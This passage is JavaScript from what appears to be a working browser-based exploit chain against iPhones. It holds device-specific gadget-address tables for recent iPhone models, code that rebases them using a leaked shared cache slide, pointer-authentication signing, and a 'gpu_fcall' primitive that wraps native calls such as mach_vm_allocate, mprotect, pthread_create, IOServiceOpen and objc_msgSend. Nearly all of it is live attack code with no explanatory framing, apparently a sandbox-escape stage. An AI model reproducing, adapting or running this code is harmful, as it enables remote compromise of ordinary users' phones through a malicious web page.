      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24d051ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x26244f98cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed792ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6e178n,
      tcall_X0LG: 0x21f03a150n,
      transformSurface_gadget: 0x21018cb70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone16,2_22G100": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23aa0302cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24d051ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x26244f98cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed792ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6e178n,
      tcall_X0LG: 0x21f03a150n,
      transformSurface_gadget: 0x21018cb70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone17,1_22G100": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23aa0302cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24c931ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x261d2f98cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed792ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6e178n,
      tcall_X0LG: 0x21f03a150n,
      transformSurface_gadget: 0x21018cb70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone17,2_22G100": {
      _4_fcalls: 0x1c62b9bf8n,
      _CFObjectCopyProperty: 0x18e436700n,
      add_x22_0x90: 0x23aa0302cn,
      dyld_signPointer_gadget: 0x1a962f0a4n,
      fcall_14_args_write_x8: 0x24c931ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82fa60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29acn,
      load_x1x3x8: 0x261d2f98cn,
      malloc_restore_0_gadget: 0x18fc3728cn,
      malloc_restore_1_gadget: 0x1ca6e95c8n,
      malloc_restore_2_gadget: 0x1a95fd6c8n,
      malloc_restore_3_gadget: 0x1901c5d34n,
      mov_x0_x22: 0x193fdb8d4n,
      self_loop: 0x18ff78d38n,
      store_x0_x0: 0x1941d89b8n,
      str_x1_x2: 0x1e6966b00n,
      tcall_CRLG: 0x23ed792ecn,
      tcall_CSSG: 0x1ad430c3cn,
      tcall_DG: 0x1e02c73f8n,
      tcall_DSSG: 0x1a9b79b10n,
      tcall_RLG: 0x20dd6e178n,
      tcall_X0LG: 0x21f03a150n,
      transformSurface_gadget: 0x21018cb70n,
      xpac_gadget: 0x1b6424a08n,
   },
   "iPhone17,3_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9fb02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c929ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26198798cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed712ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f032150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone17,4_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9fb02cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c929ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x26198798cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed712ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd66178n,
      tcall_X0LG: 0x21f032150n,
      transformSurface_gadget: 0x210184b70n,
      xpac_gadget: 0x1b6420a08n,
   },
   "iPhone17,5_22G100": {
      _4_fcalls: 0x1c62b5bf8n,
      _CFObjectCopyProperty: 0x18e432700n,
      add_x22_0x90: 0x23a9f702cn,
      dyld_signPointer_gadget: 0x1a962b0a4n,
      fcall_14_args_write_x8: 0x24c925ea8n,
      jsvm_isNAN_fcall_gadget: 0x19e82ba60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9acn,
      load_x1x3x8: 0x2616f598cn,
      malloc_restore_0_gadget: 0x18fc3328cn,
      malloc_restore_1_gadget: 0x1ca6e55c8n,
      malloc_restore_2_gadget: 0x1a95f96c8n,
      malloc_restore_3_gadget: 0x1901c1d34n,
      mov_x0_x22: 0x193fd78d4n,
      self_loop: 0x18ff74d38n,
      store_x0_x0: 0x1941d49b8n,
      str_x1_x2: 0x1e6962b00n,
      tcall_CRLG: 0x23ed6d2ecn,
      tcall_CSSG: 0x1ad42cc3cn,
      tcall_DG: 0x1e02c33f8n,
      tcall_DSSG: 0x1a9b75b10n,
      tcall_RLG: 0x20dd62178n,
      tcall_X0LG: 0x21f02e150n,
      transformSurface_gadget: 0x210180b70n,
      xpac_gadget: 0x1b6420a08n,
   }

};


    let offsets_sbx1 = sbx1_offsets[device_model];
    transformSurface_gadget = offsets_sbx1.transformSurface_gadget + shared_cache_slide;
    dyld_signPointer_gadget = offsets_sbx1.dyld_signPointer_gadget + shared_cache_slide;
    malloc_restore_0_gadget = offsets_sbx1.malloc_restore_0_gadget + shared_cache_slide;
    malloc_restore_1_gadget = offsets_sbx1.malloc_restore_1_gadget + shared_cache_slide;
    malloc_restore_2_gadget = offsets_sbx1.malloc_restore_2_gadget + shared_cache_slide;
    malloc_restore_3_gadget = offsets_sbx1.malloc_restore_3_gadget + shared_cache_slide;
    if (offsets_sbx1.set_x19_gadget != undefined) {
      set_x19_gadget = offsets_sbx1.set_x19_gadget + shared_cache_slide;
      set_x30_gadget = offsets_sbx1.set_x30_gadget + shared_cache_slide;
      load_x0_0x0_gadget = offsets_sbx1.load_x0_0x0_gadget + shared_cache_slide;
      load_x0_0x0_gadget_data = offsets_sbx1.load_x0_0x0_gadget_data + shared_cache_slide;
      new_save_x0_gadget = offsets_sbx1.new_save_x0_gadget + shared_cache_slide;
      new_save_x0_gadget_data = offsets_sbx1.new_save_x0_gadget_data + shared_cache_slide;
      isNAN_lr_gadget = offsets_sbx1.isNAN_lr_gadget + shared_cache_slide;
      mov_x8_x0_gadget = offsets_sbx1.mov_x8_x0_gadget + shared_cache_slide;
      leak_surface_address_gadget = offsets_sbx1.leak_surface_address_gadget + shared_cache_slide;
      mov_x0_x8_gadget = offsets_sbx1.mov_x0_x8_gadget + shared_cache_slide;
      save_sp_gadget = offsets_sbx1.save_sp_gadget + shared_cache_slide;
      save_x0_gadget = offsets_sbx1.save_x0_gadget + shared_cache_slide;
      save_x0_gadget_data = offsets_sbx1.save_x0_gadget_data + shared_cache_slide;
      mov_x20_x19_gadget = offsets_sbx1.mov_x20_x19_gadget + shared_cache_slide;
      restore_sp_gadget = offsets_sbx1.restore_sp_gadget + shared_cache_slide;
      xpac_gadget = offsets_sbx1.xpac_gadget + shared_cache_slide;
      restore_sp_gadget_data = offsets_sbx1.restore_sp_gadget_data + shared_cache_slide;
      load_x1_0x30_gadget = offsets_sbx1.load_x1_0x30_gadget + shared_cache_slide;
      load_x1_0x30_gadget_data = offsets_sbx1.load_x1_0x30_gadget_data + shared_cache_slide;
      load_x0_0x18_gadget = offsets_sbx1.load_x0_0x18_gadget + shared_cache_slide;
      load_x0_0x18_gadget_data = offsets_sbx1.load_x0_0x18_gadget_data + shared_cache_slide;
      dyld_objc_patching_gadget = offsets_sbx1.dyld_objc_patching_gadget + shared_cache_slide;
      dyld_patching_noprolog_gadget = offsets_sbx1.dyld_patching_noprolog_gadget + shared_cache_slide;
      set_sp_gadget = offsets_sbx1.set_sp_gadget + shared_cache_slide;
      read_surface_address_gadget = offsets_sbx1.read_surface_address_gadget + shared_cache_slide;
      dyld_patching_dispatcher_gadget = offsets_sbx1.dyld_patching_dispatcher_gadget + shared_cache_slide;
      braaz_x8_gadget = offsets_sbx1.braaz_x8_gadget + shared_cache_slide;
    }
    if (offsets_sbx1.tcall_CRLG != undefined) {
      tcall_CRLG = offsets_sbx1.tcall_CRLG + shared_cache_slide;
      tcall_X0LG = offsets_sbx1.tcall_X0LG + shared_cache_slide;
      tcall_RLG = offsets_sbx1.tcall_RLG + shared_cache_slide;
      tcall_CSSG = offsets_sbx1.tcall_CSSG + shared_cache_slide;
      tcall_DSSG = offsets_sbx1.tcall_DSSG + shared_cache_slide;
      tcall_DG = offsets_sbx1.tcall_DG + shared_cache_slide;
      _CFObjectCopyProperty = offsets_sbx1._CFObjectCopyProperty + shared_cache_slide;
      load_x1x3x8 = offsets_sbx1.load_x1x3x8 + shared_cache_slide;
      fcall_14_args_write_x8 = offsets_sbx1.fcall_14_args_write_x8 + shared_cache_slide;
      _4_fcalls = offsets_sbx1._4_fcalls + shared_cache_slide;
      self_loop = offsets_sbx1.self_loop + shared_cache_slide;
      jsvm_isNAN_fcall_gadget = offsets_sbx1.jsvm_isNAN_fcall_gadget + shared_cache_slide;
      jsvm_isNAN_fcall_gadget2 = offsets_sbx1.jsvm_isNAN_fcall_gadget2 + shared_cache_slide;
      store_x0_x0 = offsets_sbx1.store_x0_x0 + shared_cache_slide;
      str_x1_x2 = offsets_sbx1.str_x1_x2 + shared_cache_slide;
      mov_x0_x22 = offsets_sbx1.mov_x0_x22 + shared_cache_slide;
      add_x22_0x90 = offsets_sbx1.add_x22_0x90 + shared_cache_slide;
      xpac_gadget = offsets_sbx1.xpac_gadget + shared_cache_slide;
    }
    if (save_x0_gadget == 0n || save_x0_gadget == shared_cache_slide) {
      save_x0_gadget = new_save_x0_gadget;
      save_x0_gadget_data = new_save_x0_gadget_data;
    }
  } else {}
  const ios_version = function () {
    let version = /iPhone OS ([0-9_]+)/g.exec(navigator.userAgent)?.[1];
    if (version) {
      version = version.split('_').map(part => parseInt(part));
      return parseInt(version.join('')).toString(16);
    }
  }();
  function get_ios_version() {
    return ios_version;
  }
  function assert(a, b = "N/A") {
    if (!a) {
      throw new Error(`assert failed: ${b}`);
    }
  }
  function ERROR(a) {
    throw new Error(a);
  }
  function calloc(...args) {
    return gpu_fcall(CALLOC, ...args);
  }
  function realloc(...args) {
    return gpu_fcall(REALLOC, ...args);
  }
  function free(...args) {
    return gpu_fcall(FREE, ...args);
  }
  function confstr(...args) {
    return gpu_fcall(CONFSTR, ...args);
  }
  function access(...args) {
    return gpu_fcall(ACCESS, ...args);
  }
  function mkdir(...args) {
    return gpu_fcall(MKDIR, ...args);
  }
  function strlcat(...args) {
    return gpu_fcall(STRLCAT, ...args);
  }
  function strdup(...args) {
    return gpu_fcall(STRDUP, ...args);
  }
  function strlen(...args) {
    return gpu_fcall(STRLEN, ...args);
  }
  function open(...args) {
    return gpu_fcall(OPEN, ...args);
  }
  function close(...args) {
    return gpu_fcall(CLOSE, ...args);
  }
  function remove(...args) {
    return gpu_fcall(REMOVE, ...args);
  }
  function sync(...args) {
    return gpu_fcall(SYNC, ...args);
  }
  function write(...args) {
    return gpu_fcall(WRITE, ...args);
  }
  function pwrite(...args) {
    return gpu_fcall(PWRITE, ...args);
  }
  function pread(...args) {
    return gpu_fcall(PREAD, ...args);
  }
  function writev(...args) {
    return gpu_fcall(WRITEV, ...args);
  }
  function lseek(...args) {
    return gpu_fcall(LSEEK, ...args);
  }
  function memcpy(...args) {
    return gpu_fcall(MEMCPY, ...args);
  }
  function memset(...args) {
    return gpu_fcall(MEMSET, ...args);
  }
  function memmem(...args) {
    return gpu_fcall(MEMMEM, ...args);
  }
  function usleep(...args) {
    return gpu_fcall(USLEEP, ...args);
  }
  function exit(...args) {
    return gpu_fcall(EXIT, ...args);
  }
  function mach_vm_copy(...args) {
    return gpu_fcall(MACH_VM_COPY, ...args);
  }
  function mach_vm_allocate(...args) {
    return gpu_fcall(MACH_VM_ALLOCATE, ...args);
  }
  function mach_vm_deallocate(...args) {
    return gpu_fcall(MACH_VM_DEALLOCATE, ...args);
  }
  function mach_vm_read(...args) {
    return gpu_fcall(MACH_VM_READ, ...args);
  }
  function mach_vm_map(...args) {
    return gpu_fcall(MACH_VM_MAP, ...args);
  }
  function mach_vm_remap(...args) {
    return gpu_fcall(MACH_VM_REMAP, ...args);
  }
  function mach_make_memory_entry_64(...args) {
    return gpu_fcall(MACH_MAKE_MEMORY_ENTRY_64, ...args);
  }
  function mmap(...args) {
    return gpu_fcall(MMAP, ...args);
  }
  function munmap(...args) {
    return gpu_fcall(MUNMAP, ...args);
  }
  function msync(...args) {
    return gpu_fcall(MSYNC, ...args);
  }
  function mprotect(...args) {
    return gpu_fcall(MPROTECT, ...args);
  }
  function mach_absolute_time(...args) {
    return gpu_fcall(MACH_ABSOLUTE_TIME, ...args);
  }
  function mach_timebase_info(...args) {
    return gpu_fcall(MACH_TIMEBASE_INFO, ...args);
  }
  function bootstrap_look_up(...args) {
    return gpu_fcall(BOOTSTRAP_LOOK_UP, ...args);
  }
  function mach_port_allocate(...args) {
    return gpu_fcall(MACH_PORT_ALLOCATE, ...args);
  }
  function mach_port_mod_refs(...args) {
    return gpu_fcall(MACH_PORT_MOD_REFS, ...args);
  }
  function mach_port_deallocate(...args) {
    return gpu_fcall(MACH_PORT_DEALLOCATE, ...args);
  }
  function mach_port_destroy(...args) {
    return gpu_fcall(MACH_PORT_DESTROY, ...args);
  }
  function mach_port_insert_right(...args) {
    return gpu_fcall(MACH_PORT_INSERT_RIGHT, ...args);
  }
  function mach_msg(...args) {
    return gpu_fcall(MACH_MSG, ...args);
  }
  function mach_msg_send(...args) {
    return gpu_fcall(MACH_MSG_SEND, ...args);
  }
  function pthread_self(...args) {
    return gpu_fcall(PTHREAD_SELF, ...args);
  }
  function pthread_create(...args) {
    return gpu_fcall(PTHREAD_CREATE, ...args);
  }
  function pthread_create_suspended_np(...args) {
    return gpu_fcall(PTHREAD_CREATE_SUSPENDED_NP, ...args);
  }
  function pthread_attr_init(...args) {
    return gpu_fcall(PTHREAD_ATTR_INIT, ...args);
  }
  function pthread_attr_setstacksize(...args) {
    return gpu_fcall(PTHREAD_ATTR_SETSTACKSIZE, ...args);
  }
  function pthread_attr_setstackaddr(...args) {
    return gpu_fcall(PTHREAD_ATTR_SETSTACKADDR, ...args);
  }
  function pthread_mach_thread_np(...args) {
    return gpu_fcall(PTHREAD_MACH_THREAD_NP, ...args);
  }
  function pthread_join(...args) {
    return gpu_fcall(PTHREAD_JOIN, ...args);
  }
  function pthread_yield_np(...args) {
    return gpu_fcall(PTHREAD_YIELD_NP, ...args);
  }
  function thread_suspend(...args) {
    return gpu_fcall(THREAD_SUSPEND, ...args);
  }
  function thread_resume(...args) {
    return gpu_fcall(THREAD_RESUME, ...args);
  }
  function thread_terminate(...args) {
    return gpu_fcall(THREAD_TERMINATE, ...args);
  }
  function pthread_mutex_lock(...args) {
    return gpu_fcall(PTHREAD_MUTEX_LOCK, ...args);
  }
  function pthread_mutex_unlock(...args) {
    return gpu_fcall(PTHREAD_MUTEX_UNLOCK, ...args);
  }
  function ulock_wait(...args) {
    return gpu_fcall(ULOCK_WAIT, ...args);
  }
  function ulock_wake(...args) {
    return gpu_fcall(ULOCK_WAKE, ...args);
  }
  function sysctlbyname(...args) {
    return gpu_fcall(SYSCTLBYNAME, ...args);
  }
  function IOServiceMatching(...args) {
    return gpu_fcall(IOSERVICEMATCHING, ...args);
  }
  function IOServiceGetMatchingService(...args) {
    return gpu_fcall(IOSERVICEGETMATCHINGSERVICE, ...args);
  }
  function IOServiceOpen(...args) {
    return gpu_fcall(IOSERVICEOPEN, ...args);
  }
  function IOServiceClose(...args) {
    return gpu_fcall(IOSERVICECLOSE, ...args);
  }
  function IOConnectCallStructMethod(...args) {
    return gpu_fcall(IOCONNECTCALLSTRUCTMETHOD, ...args);
  }
  function pthread_mutex_init(...args) {
    return gpu_fcall(PTHREAD_MUTEX_INIT, ...args);
  }
  function kIOMainPortDefault() {
    return uread32(func_resolve("kIOMainPortDefault"));
  }
  function lazy_fcall(fname, ...args) {
    let fptr = func_resolve(fname);
    assert(fptr != 0n, `failed to lookup ${fname}`);
    return gpu_fcall(fptr, ...args);
  }
  function mach_task_self() {
    return 0x203n;
  }
  function sel_registerName(cstr) {
    return gpu_fcall(SEL_REGISTERNAME, cstr);
  }
  function objc_getClass(class_name) {
    return gpu_fcall(OBJC_GETCLASS, get_cstring(class_name));
  }
  function objc_alloc(class_obj) {
    return gpu_fcall(OBJC_ALLOC, class_obj);
  }
  function objc_alloc_init(class_obj) {
    return gpu_fcall(OBJC_ALLOC_INIT, class_obj);
  }
  function objc_msgSend(...args) {
    return gpu_fcall(OBJC_MSGSEND, ...args);
  }
  function CFStringCreateWithCString(allocator, cstring, encoding) {
    return gpu_fcall(CFSTRINGCREATEWITHCSTRING, allocator, cstring, encoding);
  }
  function CFDictionaryCreateMutable(allocator, capacity, keyCallBacks, valueCallBacks) {
    return gpu_fcall(CFDICTIONARYCREATEMUTABLE, allocator, capacity, keyCallBacks, valueCallBacks);
  }
  function CFDictionarySetValue(dict, key, value) {
    return gpu_fcall(CFDICTIONARYSETVALUE, dict, key, value);
  }
  function CFNumberCreate(allocator, theType, valuePtr) {
    return gpu_fcall(CFNUMBERCREATE, allocator, theType, valuePtr);
  }
  function IOSurfaceCreate(dict) {
    return gpu_fcall(IOSURFACECREATE, dict);
  }
  function IOSurfaceGetBaseAddress(surface) {
    return gpu_fcall(IOSURFACEGETBASEADDRESS, surface);
  }
  function IOSurfacePrefetchPages(...args) {
    return gpu_fcall(IOSURFACEPREFETCHPAGES, ...args);
  }
  function IOSurfaceGetID(...args) {
    return gpu_fcall(IOSURFACEGETID, ...args);
  }
  function CFRelease(obj) {
    return gpu_fcall(CFRELEASE, obj);
  }
  function CFShow(obj) {
    return gpu_fcall(CFSHOW, obj);
  }
  function create_cfstring(cstring) {
    return CFStringCreateWithCString(kCFAllocatorDefault, cstring, kCFStringEncodingUTF8);
  }
  function object_retainCount(obj) {
    return objc_msgSend(obj, selector_retainCount);
  }
  function object_release(obj) {
    return objc_msgSend(obj, selector_release);
  }
  function objectForKeyedSubscript(obj, cfstr_key) {
    return objc_msgSend(obj, selector_objectForKeyedSubscript, cfstr_key);
  }
  function evaluateScript(obj, jscript) {
    return objc_msgSend(obj, selector_evaluateScript, jscript);
  }
  function methodSignatureForSelector(obj, sel) {
    return objc_msgSend(obj, selector_methodSignatureForSelector, sel);
  }
  function invocationWithMethodSignature(obj, sig) {
    return objc_msgSend(obj, selector_invocationWithMethodSignature, sig);
  }
  function setArgument_atIndex(obj, arg, idx) {
    return objc_msgSend(obj, selector_setArgument_atIndex, arg, idx);
  }
  function initWithTarget_selector_object(obj, target, sel, object) {
    return objc_msgSend(obj, selector_initWithTarget_selector_object, target, sel, object);
  }
  function nsthread_start(obj) {
    return objc_msgSend(obj, selector_start);
  }
  let PAGE_SIZE = 0x4000n;
  let NULL = 0n;
  let MACH_PORT_NULL = 0n;
  let F_OK = 0n;
  let NSEC_PER_USEC = 1000n;
  let NSEC_PER_MSEC = 1000000n;
  let KERN_SUCCESS = 0n;
  let KERN_INVALID_ARGUMENT = 4n;
  let SEEK_SET = 0x0n;
  let O_RDWR = 0x2n;
  let O_CREAT = 0x200n;
  let MS_INVALIDATE = 0x2n;
  let MS_KILLPAGES = 0x4n;
  let MS_DEACTIVATE = 0x8n;
  let MS_SYNC = 0x10n;
  let PROT_NONE = 0n;
  let PROT_READ = 0x1n;
  let PROT_WRITE = 0x2n;
  let VM_PROT_DEFAULT = 0x3n;
  const MAP_MEM_VM_SHARE = 0x400000n;
  let MAP_SHARED = 0x1n;
  let MAP_PRIVATE = 0x2n;
  let MAP_ANON = 0x1000n;
  let VM_FLAGS_FIXED = 0x0n;
  let VM_FLAGS_ANYWHERE = 0x1n;
  let VM_FLAGS_RANDOM_ADDR = 0x8n;
  let VM_FLAGS_OVERWRITE = 0x4000n;
  let VM_INHERIT_NONE = 2n;
  let _CS_DARWIN_USER_TEMP_DIR = 65537n;
  let MAXPATHLEN = 1024n;
  let UL_COMPARE_AND_WAIT = 1n;
  let ULF_WAKE_ALL = 0x100n;
  function uread_bitsize(where, bs) {
    let mask = (0x1n << bs) - 0x1n;
    return uread64(where) & mask;
  }
  function uread32(where) {
    return uread_bitsize(where, 32n);
  }
  function uwrite_bitsize(where, what, bs) {
    let mask = (0x1n << bs) - 0x1n;
    let new_what = uread64(where) & ~mask | what & mask;
    uwrite64(where, new_what);
  }
  let UINT64_BITSIZE = 0x8n * 0x8n;
  let UINT32_BITSIZE = 0x8n * 0x4n;
  let UINT16_BITSIZE = 0x8n * 0x2n;
  let UINT8_BITSIZE = 0x8n * 0x1n;
  function struct_field_set(struct, buf, field, val) {
    let bit_size = struct[field][0];
    let offset = struct[field][1];
    uwrite_bitsize(buf + offset, val, bit_size);
  }
  function struct_field_get(struct, buf, field) {
    let bit_size = struct[field][0];
    let offset = struct[field][1];
    return uread_bitsize(buf + offset, bit_size);
  }
  function get_field_addr(struct, buf, field) {
    return buf + struct[field][1];
  }
  function trunc_page(x) {
    return x & 0xffffffffffffc000n;
  }
  function new_uint64_t(val = 0n) {
    let buf = calloc(1n, 8n);
    uwrite64(buf, val);
    return buf;
  }
  function setup_fcall_jopchain() {
    let save_sp_args = calloc(1n, PAGE_SIZE);
    let set_sp_stack_ptr = new_uint64_t();
    mach_vm_allocate(mach_task_self(), set_sp_stack_ptr, PAGE_SIZE * 0x20n, VM_FLAGS_ANYWHERE);
    let new_thread_set_sp_stack = uread64(set_sp_stack_ptr);
    new_thread_set_sp_stack += PAGE_SIZE * 0x10n;
    uwrite64(save_sp_args + 0x0n, new_thread_set_sp_stack);
    uwrite64(save_sp_args + 0x8n, pacia(set_sp_gadget, 0x720fn));
    uwrite64(save_sp_args + 0x10n, pacia(set_all_registers_gadget, 0n));
    let new_thread_dyld_patching_args = calloc(1n, PAGE_SIZE);
    uwrite64(new_thread_dyld_patching_args + 0x108n, save_sp_args);
    uwrite64(new_thread_dyld_patching_args + 0x110n, 1n);
    uwrite64(new_thread_dyld_patching_args + 0x2a0n, pacia(save_sp_gadget, 0n));
    return {
      "save_sp_args": save_sp_args,
      "set_sp_stack": new_thread_set_sp_stack,
      "dyld_patching_args": new_thread_dyld_patching_args
    };
  }
  function setup_dyld_patching_fcall(pc, x0, x1, x2, x3) {
    let args = calloc(1n, 0x100n);
    uwrite64(args + 0x00n, x0);
    uwrite64(args + 0x08n, x1);
    uwrite64(args + 0x10n, x2);
    uwrite64(args + 0x18n, x3);
    let dyld_patching_args = calloc(1n, PAGE_SIZE);
    LOG(`dyld_patching_args: ${dyld_patching_args.hex()}`);
    uwrite64(dyld_patching_args + 0x8n, dyld_patching_args);
    uwrite64(dyld_patching_args + 0x108n, args);
    uwrite64(dyld_patching_args + 0x110n, 0n);
    uwrite64(dyld_patching_args + 0x2a0n, pacia(xpac(pc), 0n));
    return dyld_patching_args;
  }
  let PTHREAD_SELF = func_resolve("pthread_self");
  let SYSLOG = func_resolve("syslog");
  let PUTS = func_resolve("puts");
  let DLOPEN = func_resolve("dlopen");
  let PTHREAD_GETSPECIFIC = func_resolve("pthread_getspecific");
  let CALLOC = func_resolve("calloc");
  let REALLOC = func_resolve("realloc");
  let FREE = func_resolve("free");
  let CONFSTR = func_resolve("confstr");
  let ACCESS = func_resolve("access");
  let MKDIR = func_resolve("mkdir");
  let STRLCAT = func_resolve("strlcat");
  let STRDUP = func_resolve("strdup");
  let STRLEN = func_resolve("strlen");
  let OPEN = func_resolve("open");
  let CLOSE = func_resolve("close");
  let REMOVE = func_resolve("remove");
  let SYNC = func_resolve("sync");
  let WRITE = func_resolve("write");
  let PWRITE = func_resolve("pwrite");
  let PREAD = func_resolve("pread");
  let WRITEV = func_resolve("writev");
  let LSEEK = func_resolve("lseek");
  let MEMCPY = func_resolve("memcpy");
  let MEMSET = func_resolve("memset");
  let MEMMEM = func_resolve("memmem");
  let USLEEP = func_resolve("usleep");
  let EXIT = func_resolve("exit");
  let MACH_VM_COPY = func_resolve("mach_vm_copy");
  let MACH_VM_ALLOCATE = func_resolve("mach_vm_allocate");
  let MACH_VM_DEALLOCATE = func_resolve("mach_vm_deallocate");
  let MACH_VM_READ = func_resolve("mach_vm_read");
  let MACH_VM_MAP = func_resolve("mach_vm_map");
  let MACH_VM_REMAP = func_resolve("mach_vm_remap");
  let MACH_MAKE_MEMORY_ENTRY_64 = func_resolve("mach_make_memory_entry_64");
  let MMAP = func_resolve("mmap");
  let MUNMAP = func_resolve("munmap");
  let MSYNC = func_resolve("msync");
  let MPROTECT = func_resolve("mprotect");
  let MACH_ABSOLUTE_TIME = func_resolve("mach_absolute_time");
  let MACH_TIMEBASE_INFO = func_resolve("mach_timebase_info");
  let BOOTSTRAP_LOOK_UP = func_resolve("bootstrap_look_up");
  let MACH_PORT_ALLOCATE = func_resolve("mach_port_allocate");
  let MACH_PORT_MOD_REFS = func_resolve("mach_port_mod_refs");
  let MACH_PORT_DEALLOCATE = func_resolve("mach_port_deallocate");
  let MACH_PORT_DESTROY = func_resolve("mach_port_destroy");
  let MACH_PORT_INSERT_RIGHT = func_resolve("mach_port_insert_right");
  let MACH_MSG = func_resolve("mach_msg");
  let MACH_MSG_SEND = func_resolve("mach_msg_send");
  let PTHREAD_CREATE = func_resolve("pthread_create");
  let PTHREAD_CREATE_SUSPENDED_NP = func_resolve("pthread_create_suspended_np");
  let PTHREAD_ATTR_INIT = func_resolve("pthread_attr_init");
  let PTHREAD_ATTR_SETSTACKSIZE = func_resolve("pthread_attr_setstacksize");
  let PTHREAD_ATTR_SETSTACKADDR = func_resolve("pthread_attr_setstackaddr");
  let PTHREAD_MACH_THREAD_NP = func_resolve("pthread_mach_thread_np");
  let PTHREAD_JOIN = func_resolve("pthread_join");
  let PTHREAD_YIELD_NP = func_resolve("pthread_yield_np");
  let THREAD_SUSPEND = func_resolve("thread_suspend");
  let THREAD_RESUME = func_resolve("thread_resume");
  let THREAD_TERMINATE = func_resolve("thread_terminate");
  let THREAD_POLICY_SET = func_resolve("thread_policy_set");
  let PTHREAD_MUTEX_INIT = func_resolve("pthread_mutex_init");
  let PTHREAD_MUTEX_LOCK = func_resolve("pthread_mutex_lock");
  let PTHREAD_MUTEX_UNLOCK = func_resolve("pthread_mutex_unlock");
  let ULOCK_WAIT = func_resolve("__ulock_wait");
  let ULOCK_WAKE = func_resolve("__ulock_wake");
  let SYSCTLBYNAME = func_resolve("sysctlbyname");
  let IOSERVICEMATCHING = func_resolve("IOServiceMatching");
  let IOSERVICEGETMATCHINGSERVICE = func_resolve("IOServiceGetMatchingService");
  let IOSERVICEOPEN = func_resolve("IOServiceOpen");
  let IOSERVICECLOSE = func_resolve("IOServiceClose");
